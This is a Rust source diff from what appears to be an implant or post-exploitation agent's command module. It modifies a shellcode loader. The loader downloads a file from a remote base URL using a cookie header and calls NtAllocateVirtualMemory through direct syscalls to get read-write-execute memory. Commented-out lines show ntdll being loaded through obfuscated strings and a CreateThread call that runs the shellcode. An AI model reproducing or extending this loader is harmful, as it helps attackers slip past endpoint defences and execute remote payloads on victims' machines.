@@ -5,7 +5,6 @@ pub mod command {
     use std::ptr::{null, null_mut};
     use std::os::raw::c_void;
     use rust_syscalls::syscall;
-    use ntapi::ntmmapi::NtAllocateVirtualMemory;
 
     fn get_file_vec(
         base_url: &str,
@@ -60,24 +59,46 @@ pub mod command {
         let file_vec = get_file_vec(base_url, file_name, cookie_header);
 
         let file_bytes: &[u8] = &file_vec;
-        let file_size: *mut usize = &mut file_bytes.len();
+        let mut region_size: usize = file_bytes.len();
 
         let old_perms = PAGE_READWRITE;
+
+        use winapi::shared::basetsd::SIZE_T;
+        use winapi::um::winnt::{HANDLE, PAGE_READWRITE};
 
 
         unsafe {
 
-            let curr_process = (kernel32.GetCurrentProcess)();
-            let mut dest: *mut c_void = null_mut();
-            let mut ret: u32 = 0;
+            let process_handle: HANDLE = unsafe { winapi::um::processthreadsapi::GetCurrentProcess() };
+            let mut base_address: *mut winapi::ctypes::c_void = null_mut();
+           // let mut region_size: SIZE_T = 4096; // Size of each page in bytes
 
-            if memory_permissions == "RX" {
-                let a = syscall!("NtAllocateVirtualMemory", curr_process, dest, 0, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);
-                // let a = NtAllocateVirtualMemory(std::mem::transmute(curr_process), std::mem::transmute(dest), 0, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);
-                ret = std::mem::transmute(a);
-            } else {
 
-            }
+
+                let a = syscall!("NtAllocateVirtualMemory", process_handle,
+                    &mut base_address,
+                    0,
+                    &mut region_size,
+                    MEM_COMMIT | MEM_RESERVE,
+                    PAGE_EXECUTE_READWRITE
+                );
+                // // let a = NtAllocateVirtualMemory(std::mem::transmute(curr_process), std::mem::transmute(dest), 0, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);
+                // let nt = libloading::Library::new(lc!("ntdll.dll")).unwrap();
+
+                // let nt_alloc_v_mem: libloading::Symbol<unsafe extern "C" fn(HANDLE, &*mut _, i32, *mut usize, u32, u32) -> u32>
+                // = nt.get(b"NtAllocateVirtualMemory\0").unwrap();
+
+                // let a = nt_alloc_v_mem(process_handle,
+                //     &mut base_address,
+                //     0,
+                //     &mut region_size,
+                //     MEM_COMMIT | MEM_RESERVE,
+                //     PAGE_EXECUTE_READWRITE,
+                // );
+
+                // ret = std::mem::transmute(a);
+                // d = dest;
+
 
             // // If specified to use RW memory, allocate, copy, change to RX, execute
             // if memory_permissions == "RW" {
@@ -108,7 +129,7 @@ pub mod command {
             //     // Run the shellcode
             //     let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
             // }
-            format!("return code {} {}", ret, 123)
+            format!("dest {:?} ret {}", base_address, a)
         }
     }
 
